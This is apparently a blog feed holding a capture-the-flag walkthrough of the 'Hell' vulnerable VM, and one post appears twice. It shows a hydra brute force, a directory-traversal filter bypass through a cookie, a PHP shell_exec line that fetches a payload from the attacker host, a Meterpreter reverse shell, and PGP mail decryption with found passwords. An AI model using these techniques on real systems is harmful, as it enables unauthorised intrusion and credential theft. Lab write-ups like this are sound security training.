-rwx&mdash;&mdash; 1 jack jack  890 Jun 18 12:24 pgp.pub
$ cat .pgp/note
The usual password as with everything.
$</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>We can assume the password is either **g0tmi1k69** or **zgcR6mU6pX**. GPG is installed, so the next logical step is to try and decrypt the email using either of these two passwords and Jack<span class="err">&#39;</span>s PGP private key.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ gpg &ndash;import .pgp/pgp.priv
gpg: key 3F18AB0A: secret key imported
gpg: /home/jack/.gnupg/trustdb.gpg: trustdb created
gpg: key 3F18AB0A: public key &ldquo;<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#106;&#97;&#99;&#x6b;&#64;&#99;&#111;&#119;&#x6c;&#111;&#x76;&#x65;&#114;&#x73;&#x2e;&#99;&#111;&#109;">&#106;&#x61;&#x63;&#107;&#x40;&#99;&#111;&#x77;&#108;&#x6f;&#118;&#101;&#114;&#x73;&#x2e;&#99;&#111;&#x6d;</a>&rdquo; imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
$ gpg -o email.txt /var/mail/jack/received/message.eml</p>

<p>You need a passphrase to unlock the secret key for
user: &ldquo;<a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#106;&#97;&#99;&#107;&#x40;&#99;&#x6f;&#119;&#x6c;&#x6f;&#x76;&#x65;&#x72;&#115;&#x2e;&#99;&#x6f;&#109;">&#106;&#97;&#x63;&#107;&#64;&#99;&#111;&#119;&#108;&#111;&#x76;&#101;&#x72;&#x73;&#46;&#99;&#111;&#x6d;</a>&rdquo;</p>

<p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>

<p>Enter passphrase: g0tmi1k69
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
      &ldquo;<a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#x6a;&#97;&#x63;&#x6b;&#x40;&#x63;&#x6f;&#x77;&#108;&#x6f;&#x76;&#101;&#x72;&#x73;&#x2e;&#99;&#111;&#x6d;">&#x6a;&#97;&#x63;&#x6b;&#64;&#x63;&#111;&#x77;&#x6c;&#111;&#x76;&#101;&#x72;&#115;&#46;&#99;&#x6f;&#x6d;</a>&rdquo;
gpg: WARNING: message was not integrity protected
$ cat email.txt
Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>

<p>The password is &lsquo;4J0WWvL5nS&rsquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Thank you, Jack, <span class="k">for</span> being a predictable - yet persistent - weirdo. A quick hop and a skip over to the worryingly named milk_4_life account and we can carry.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ su milk_4_life
Password: 4J0WWvL5nS</p>

<p>$ whoami
milk_4_life
$
&#8220;`</p>

<p>Tomorrow we&rsquo;ll play a game. Oooh, cryptic.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough - Part 1]]></title>
    <link href="http://recrudesce.github.io/2014/07/17/hell-walkthrough-part-1/"/>
    <updated>2014-07-17T20:37:23+01:00</updated>
    <id>http://recrudesce.github.io/2014/07/17/hell-walkthrough-part-1</id>
    <content type="html"><![CDATA[<p>Part 1 | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>

<p>A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.  This is going to be a multipart walkthrough, therefore keep checking back for updates.</p>

<blockquote>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P
> 
> &#8211; Russ Watts (@recrudesce) [July 16, 2014](https://twitter.com/recrudesce/statuses/489505727887978496)</blockquote>




<!-- more -->


<hr />

<h2>Scoping the Joint</h2>

<p>NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 --script banner 192.168.0.103
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-07-17 19:39 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.103
</span><span class='line'>Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">996</span> closed ports
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>22/tcp  open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
</span><span class='line'>80/tcp  open  http
</span><span class='line'>111/tcp open  rpcbind
</span><span class='line'>666/tcp open  doom
</span><span class='line'><span class="p">|</span>_banner: Welcome to the Admin Panel
</span><span class='line'>MAC Address: 08:00:27:FF:3F:A0 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 5.20 seconds
</span></code></pre></td></tr></table></div></figure>


<p>OK, so we have SSH, HTTP and apparently Doom (<a href="http://www.kongregate.com/games/mike_id/doom-1">yay Doom !</a>) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it&rsquo;s a distraction and a diversionary tactic - don&rsquo;t go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !</p>

<p>Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png" alt="" /></a></p>

<p>This doesn&rsquo;t give us much to go on, therefore let&rsquo;s try out some simple things any pentester should try - let&rsquo;s see if a robots.txt file exists.  Well what do you know&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png" alt="" /></a></p>

<p>The /personal/ folder shows a creepy shrine site (this is incidentally the closest I&rsquo;ve ever been to the face of a cow)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png" alt="" /></a></p>

<p>Yeah, creepy&hellip; The /super_secret_login_path_muhahaha/ folder presents a login page</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png" alt="" /></a></p>

<hr />

<h2>Getting In</h2>

<p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# cewl http://192.168.0.103/personal/ -d <span class="m">1</span> -m <span class="m">6</span> -w password_list.txt -v
</span><span class='line'>CeWL 5.0 Robin Wood <span class="o">(</span>robin@digininja.org<span class="o">)</span> <span class="o">(</span>www.digininja.org<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Starting at http://192.168.0.103/personal/
</span><span class='line'>Visiting: http://192.168.0.103/personal/, got response code 200
</span><span class='line'>Attribute text found:
</span><span class='line'>
</span><span class='line'>Words found
</span><span class='line'>
</span><span class='line'>root@pwk:~# john --wordlist<span class="o">=</span>password_list.txt --rules --stdout &gt; password_list-mutated.txt
</span><span class='line'>words: <span class="m">4251</span>  <span class="nb">time</span>: 0:00:00:00 DONE <span class="o">(</span>Thu Jul <span class="m">17</span> 20:08:13 2014<span class="o">)</span>  w/s: <span class="m">47233</span>  current: forever99
</span></code></pre></td></tr></table></div></figure>


<p>Now we have a password list, we can use hydra to brute force the login.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# hydra 192.168.0.103 http-form-post <span class="s2">&quot;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&quot;</span> -l jack -P password_list-mutated.txt -t <span class="m">20</span> -w <span class="m">1</span> -o hydra-http-post-attack.txt
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span><span class="m">2013</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for</span> legal purposes only
</span><span class='line'>
</span><span class='line'><span class="o">[</span>WARNING<span class="o">]</span> the waittime you <span class="nb">set </span>is low, this can result in errornous results
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2014-07-17 20:10:12
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> <span class="m">20</span> tasks, <span class="m">1</span> server, <span class="m">4251</span> login tries <span class="o">(</span>l:1/p:4251<span class="o">)</span>, ~212 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port 80
</span><span class='line'><span class="o">[</span>80<span class="o">][</span>www-form<span class="o">]</span> host: 192.168.0.103   login: jack   password: g0tmi1k69
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2014-07-17 20:10:22
</span></code></pre></td></tr></table></div></figure>


<p>Success, username <strong>jack</strong>, password <strong>g0tmi1k69</strong> (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png" alt="" /></a></p>

<p>I won&rsquo;t explain each section, but the two sections we are going to use are Notes and Personal.
Notes allows us to write arbitrary text to a note.txt file stored in &ldquo;temporary storage&rdquo;, which is assumed to be /tmp as this is usually what people define as temporary storage.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png" alt="hell_009" /></a></p>

<p>Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png" alt="" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png" alt="" /></a></p>

<p>When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png" alt="hell_015" /></a></p>

<p>On further investigation, the <strong>intruder</strong> attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there&rsquo;s a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using &hellip;.// or &hellip;/./ instead.  Here&rsquo;s /etc/passwd included by setting the <strong>intruder</strong> cookie attribute to &hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png" alt="hell_008" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png" alt="" /></a></p>

<p>It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfpayload php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.110 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> R &gt; sneaky.txt
</span></code></pre></td></tr></table></div></figure>


<p>As we are using a staged payload, a handler is required, therefore one is set up via Metasploit</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; use multi/handler
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload php/meterpreter/reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; php/meterpreter/reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 443
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 443
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 192.168.0.110
</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 192.168.0.110
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.110:443
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span></code></pre></td></tr></table></div></figure>


<p>Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;?php <span class="nb">echo </span>shell_exec<span class="o">(</span><span class="s1">&#39;wget http://192.168.0.110/sneaky.txt -O /tmp/sneaky.txt 2&gt;&amp;1&#39;</span><span class="o">)</span><span class="p">;</span>?&gt;
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png" alt="hell_011" /></a></p>

<p>Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png" alt="hell_012" /></a></p>

<p>When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png" alt="hell_013" /></a></p>

<p>We&rsquo;re onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png" alt="hell_014" /></a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">40551</span> bytes<span class="o">)</span> to 192.168.0.103
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.110:443 -&gt; 192.168.0.103:48153<span class="o">)</span> at 2014-07-17 21:55:37 +0100
</span><span class='line'>
</span><span class='line'>meterpreter &gt;
</span></code></pre></td></tr></table></div></figure>


<p>Now would be a good time for a party, but there&rsquo;s hacking to do.  Plus I have no cake or balloons.  Or friends. <em><em>whimper</em></em> &hellip; HACKING !!!</p>

<p>The Metepreter session can be used to get a shell, which doesn&rsquo;t seem to be TTY, but we can fix that with a nifty command thanks to <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a> himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process <span class="m">10279</span> created.
</span><span class='line'>Channel <span class="m">0</span> created.
</span><span class='line'>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>BAM ! We&rsquo;ve just started the journey. Now onto <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2">Part 2</a> - which involves further enumeration, and some hopping between users. You&rsquo;re in for a long long ride.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough]]></title>
    <link href="http://recrudesce.github.io/2014/07/17/hell-walkthrough/"/>
    <updated>2014-07-17T16:17:18+01:00</updated>
    <id>http://recrudesce.github.io/2014/07/17/hell-walkthrough</id>
    <content type="html"><![CDATA[<p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>

<p>A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.</p>

<blockquote>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P
> 
> &#8211; Russ Watts (@recrudesce) [July 16, 2014](https://twitter.com/recrudesce/statuses/489505727887978496)</blockquote>




<!-- more -->


<hr />

<h2>Scoping the Joint</h2>

<p>NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T4 --script banner 192.168.0.103
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-07-17 19:39 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 192.168.0.103
</span><span class='line'>Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">996</span> closed ports
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>22/tcp  open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
</span><span class='line'>80/tcp  open  http
</span><span class='line'>111/tcp open  rpcbind
</span><span class='line'>666/tcp open  doom
</span><span class='line'><span class="p">|</span>_banner: Welcome to the Admin Panel
</span><span class='line'>MAC Address: 08:00:27:FF:3F:A0 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 5.20 seconds
</span></code></pre></td></tr></table></div></figure>


<p>OK, so we have SSH, HTTP and apparently Doom (<a href="http://www.kongregate.com/games/mike_id/doom-1">yay Doom !</a>) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it&rsquo;s a distraction and a diversionary tactic - don&rsquo;t go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !</p>

<p>Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png" alt="" /></a></p>

<p>This doesn&rsquo;t give us much to go on, therefore let&rsquo;s try out some simple things any pentester should try - let&rsquo;s see if a robots.txt file exists.  Well what do you know&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png" alt="" /></a></p>

<p>The /personal/ folder shows a creepy shrine site (this is incidentally the closest I&rsquo;ve ever been to the face of a cow)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png" alt="" /></a></p>

<p>Yeah, creepy&hellip; The /super_secret_login_path_muhahaha/ folder presents a login page</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png" alt="" /></a></p>

<hr />

<h2>Getting In</h2>

<p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# cewl http://192.168.0.103/personal/ -d <span class="m">1</span> -m <span class="m">6</span> -w password_list.txt -v
</span><span class='line'>CeWL 5.0 Robin Wood <span class="o">(</span>robin@digininja.org<span class="o">)</span> <span class="o">(</span>www.digininja.org<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Starting at http://192.168.0.103/personal/
</span><span class='line'>Visiting: http://192.168.0.103/personal/, got response code 200
</span><span class='line'>Attribute text found:
</span><span class='line'>
</span><span class='line'>Words found
</span><span class='line'>
</span><span class='line'>root@pwk:~# john --wordlist<span class="o">=</span>password_list.txt --rules --stdout &gt; password_list-mutated.txt
</span><span class='line'>words: <span class="m">4251</span>  <span class="nb">time</span>: 0:00:00:00 DONE <span class="o">(</span>Thu Jul <span class="m">17</span> 20:08:13 2014<span class="o">)</span>  w/s: <span class="m">47233</span>  current: forever99
</span></code></pre></td></tr></table></div></figure>


<p>Now we have a password list, we can use hydra to brute force the login.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# hydra 192.168.0.103 http-form-post <span class="s2">&quot;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&quot;</span> -l jack -P password_list-mutated.txt -t <span class="m">20</span> -w <span class="m">1</span> -o hydra-http-post-attack.txt
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span><span class="m">2013</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for</span> legal purposes only
</span><span class='line'>
</span><span class='line'><span class="o">[</span>WARNING<span class="o">]</span> the waittime you <span class="nb">set </span>is low, this can result in errornous results
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2014-07-17 20:10:12
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> <span class="m">20</span> tasks, <span class="m">1</span> server, <span class="m">4251</span> login tries <span class="o">(</span>l:1/p:4251<span class="o">)</span>, ~212 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service http-post-form on port 80
</span><span class='line'><span class="o">[</span>80<span class="o">][</span>www-form<span class="o">]</span> host: 192.168.0.103   login: jack   password: g0tmi1k69
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2014-07-17 20:10:22
</span></code></pre></td></tr></table></div></figure>


<p>Success, username <strong>jack</strong>, password <strong>g0tmi1k69</strong> (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png" alt="" /></a></p>

<p>I won&rsquo;t explain each section, but the two sections we are going to use are Notes and Personal.
Notes allows us to write arbitrary text to a note.txt file stored in &ldquo;temporary storage&rdquo;, which is assumed to be /tmp as this is usually what people define as temporary storage.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png" alt="hell_009" /></a></p>

<p>Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png" alt="" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png" alt="" /></a></p>

<p>When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.</p>

